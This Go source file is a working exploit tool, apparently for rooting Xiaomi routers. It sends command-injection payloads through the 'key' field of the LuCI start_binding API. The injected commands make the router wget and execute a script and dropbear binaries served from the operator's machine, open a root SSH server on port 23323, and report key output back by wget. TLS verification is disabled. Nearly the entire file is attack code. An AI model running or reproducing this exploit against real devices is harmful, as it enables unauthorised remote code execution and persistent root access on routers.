package main

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	port          = "8888"
	trigger       = "Generating 2048 bit rsa key"
	sshInfo       = "SSH 已开启。使用 root 账户登录 %s:23323，密码通过 SN 码计算 https://mi.tellme.top/"
	serverMsg     = "HTTP 服务已启动，监听地址: %s"
	crackTimeout  = 60 * time.Second
	urlFormat     = "http://%s/cgi-bin/luci/;stok=%s/api/xqsystem/start_binding"
	ping1Template = `mkdir -p /etc/config/dropbear
a=$(/tmp/dropbearkey -t rsa -f /etc/config/dropbear/dropbear_rsa_host_key 2>&1 | base64 -w 0)
/tmp/dropbear -r /etc/config/dropbear/dropbear_rsa_host_key -p 23323
wget "http://{{LOCAL_IP}}:{{PORT}}/$a"`
)

// CrackConfig 保存一次执行所需的输入参数。
type CrackConfig struct {
	LocalIP  string
	RouterIP string
	Token    string
}

// Validate 校验 IP 与 token，避免无效输入进入网络请求流程。
func (config CrackConfig) Validate() error {
	if config.LocalIP == "" || config.RouterIP == "" || config.Token == "" {
		return errors.New("请输入完整的本机 IP、路由器 IP 和 token")
	}
	if !isValidIPv4(config.LocalIP) {
		return fmt.Errorf("无效的本机 IP 地址: %s", config.LocalIP)
	}
	if !isValidIPv4(config.RouterIP) {
		return fmt.Errorf("无效的路由器 IP 地址: %s", config.RouterIP)
	}
	return nil
}

// executeCrack 串联 payload 生成、HTTP 文件服务、请求发送与回连等待。
func executeCrack(config CrackConfig, logger *log.Logger) error {
	if err := config.Validate(); err != nil {
		return err
	}

	if err := createPayload(config.LocalIP, logger); err != nil {
		return err
	}

	server, done, err := startPayloadServer(config.LocalIP, config.RouterIP, logger)
	if err != nil {
		return err
	}
	defer shutdownServer(server, logger)

	if err := sendAndExecutePayload(config.RouterIP, config.Token, config.LocalIP, logger); err != nil {
		return err
	}

	// 路由器完成密钥生成后会把 dropbearkey 输出回传为 base64 路径。
	select {
	case <-done:
		logger.Printf(sshInfo, config.RouterIP)
		return nil
	case <-time.After(crackTimeout):
		return errors.New("等待路由器回连超时，请检查防火墙、8888 端口占用和网络连通性")
	}
}

type customHandler struct {
	routerIP string
	logger   *log.Logger
	done     chan struct{}
	once     sync.Once
}

// ServeHTTP 提供 dropbear 文件下载，并识别路由器回传的密钥生成输出。
func (handler *customHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	requestPath := strings.TrimPrefix(r.URL.Path, "/")
	if serveAllowedFile(w, r, requestPath) {
		return
	}

	decodedMessage, err := base64.StdEncoding.DecodeString(requestPath)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	if strings.HasPrefix(string(decodedMessage), trigger) {
		handler.once.Do(func() {
			close(handler.done)
		})
		w.WriteHeader(http.StatusOK)
		return
	}
	w.WriteHeader(http.StatusOK)
}

// serveAllowedFile 只允许路由器下载执行所需的三个文件，避免暴露工作目录其他内容。
func serveAllowedFile(w http.ResponseWriter, r *http.Request, requestPath string) bool {
	switch requestPath {
	case "ping1", "dropbear", "dropbearkey":
		if _, err := os.Stat(requestPath); err == nil {
			http.ServeFile(w, r, requestPath)
			return true
		}
	}
	return false
}

// startPayloadServer 启动本地 HTTP 服务，并返回完成信号用于等待路由器回连。
func startPayloadServer(localIP, routerIP string, logger *log.Logger) (*http.Server, <-chan struct{}, error) {
	done := make(chan struct{})
	handler := &customHandler{
		routerIP: routerIP,
		logger:   logger,
		done:     done,
	}
	server := &http.Server{
		Addr:              ":" + port,
		Handler:           handler,
		ReadHeaderTimeout: 5 * time.Second,
		ReadTimeout:       5 * time.Second,
		WriteTimeout:      5 * time.Second,
	}

	listener, err := net.Listen("tcp", server.Addr)
	if err != nil {
		return nil, nil, fmt.Errorf("HTTP 服务启动失败: %w", err)
	}

	logger.Printf(serverMsg, localIP+":"+port)
	go func() {
		if err := server.Serve(listener); err != nil && !errors.Is(err, http.ErrServerClosed) {
			logger.Printf("HTTP 服务异常退出: %v", err)
		}
	}()

	return server, done, nil
}

// shutdownServer 在任务完成或失败时关闭 HTTP 服务，释放 8888 端口。
func shutdownServer(server *http.Server, logger *log.Logger) {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	if err := server.Shutdown(ctx); err != nil {
		logger.Printf("HTTP 服务关闭失败: %v", err)
	}
}

// createPayload 根据本机 IP 生成路由器需要下载并执行的脚本。
func createPayload(localIP string, logger *log.Logger) error {
	content := strings.ReplaceAll(ping1Template, "{{LOCAL_IP}}", localIP)
	content = strings.ReplaceAll(content, "{{PORT}}", port)
	content = strings.ReplaceAll(content, "\r\n", "\n")
	content = strings.TrimSpace(content)

	if err := os.WriteFile("ping1", []byte(content), 0644); err != nil {
		logger.Printf("写入 payload 文件失败: %v", err)
		return err
	}
	logger.Println("payload 文件已生成: ping1")
	return nil
}

// sendAndExecutePayload 依次发送下载与执行请求，触发路由器拉取本地文件。
func sendAndExecutePayload(routerIP, token, localIP string, logger *log.Logger) error {
	url := fmt.Sprintf(urlFormat, routerIP, token)
	headers := map[string]string{
		"Host":                      routerIP,
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Encoding":           "gzip, deflate",
		"Accept-Language":           "zh-CN,zh;q=0.9",
		"Connection":                "close",
		"Content-Type":              "application/x-www-form-urlencoded",
	}

	payloads := []string{
		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/ping1%%0Awget%%20\"http://%s:%s/ping1\"%%20-P%%20/tmp'", localIP, port),
		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/dropbear%%0Awget%%20\"http://%s:%s/dropbear\"%%20-P%%20/tmp'", localIP, port),
		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/dropbearkey%%0Awget%%20\"http://%s:%s/dropbearkey\"%%20-P%%20/tmp'", localIP, port),
		"uid=1234&key=1234'%%0Achmod%%20%%2bx%%20/tmp/ping1%%0Achmod%%20%%2bx%%20/tmp/dropbear%%0Achmod%%20%%2bx%%20/tmp/dropbearkey%%0a/tmp/ping1'",
	}

	for index, payload := range payloads {
		logger.Printf("发送第 %d/%d 个请求", index+1, len(payloads))
		if err := sendPostRequest(url, headers, payload); err != nil {
			return err
		}
	}
	return nil
}

// sendPostRequest 创建并发送 POST 请求，失败时返回带状态码的错误信息。
func sendPostRequest(url string, headers map[string]string, payload string) error {
	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		return fmt.Errorf("创建 HTTP 请求失败: %w", err)
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	// 路由器接口可能使用自签名证书；此处保持旧行为以兼容目标环境。
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("发送 HTTP 请求失败: %w", err)
	}
	defer func() {
		_ = resp.Body.Close()
	}()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("HTTP 请求失败，状态码: %d，响应: %s", resp.StatusCode, string(body))
	}
	return nil
}

// getLocalIPs 枚举非回环 IPv4 地址，供用户选择本机监听地址。
func getLocalIPs() ([]string, error) {
	var ips []string
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return nil, err
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}
	return ips, nil
}

// isValidIPv4 判断字符串是否为有效 IPv4 地址。
func isValidIPv4(ip string) bool {
	parsedIP := net.ParseIP(ip)
	return parsedIP != nil && parsedIP.To4() != nil
}
